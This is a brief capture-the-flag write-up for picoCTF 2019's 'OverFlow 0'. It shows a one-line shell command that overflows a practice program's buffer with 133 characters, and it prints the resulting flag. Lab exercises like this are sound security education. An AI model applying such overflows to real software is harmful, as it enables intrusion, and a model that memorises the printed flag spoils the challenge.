# OverFlow 0 

## Problem
This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/8df893afa5d4ecda515901499b0fdd52/vuln) and get a flag. Its also found in /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [Source](https://2019shell1.picoctf.com/static/8df893afa5d4ecda515901499b0fdd52/vuln.c).

## Solution
The name is the give away.  Buffer overflow.
```
wiglaf1979@pico-2019-shell1:/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7$ ./vuln `python -c "print 'a'*(133)"`
picoCTF{3asY_P3a5yb197d4e2}
```

